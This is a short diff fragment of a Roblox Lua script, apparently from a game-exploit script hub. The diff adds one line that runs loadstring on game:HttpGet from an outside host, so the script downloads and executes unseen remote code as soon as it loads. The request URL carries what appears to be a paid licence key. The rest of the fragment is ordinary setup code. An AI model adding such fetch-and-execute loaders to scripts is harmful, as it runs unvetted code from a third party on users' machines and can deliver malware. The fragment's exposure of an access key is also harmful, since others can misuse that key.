@@ -1,4 +1,5 @@
 repeat task.wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://hybrid-e3.com/api/scripts/607034550f534374b8fc5feb1c6ef466/loader?key=PAID-4LJT-0PLB-VM3N-N1FY"))()
 local CoreGui = game:GetService("CoreGui")
 
 local obsidian
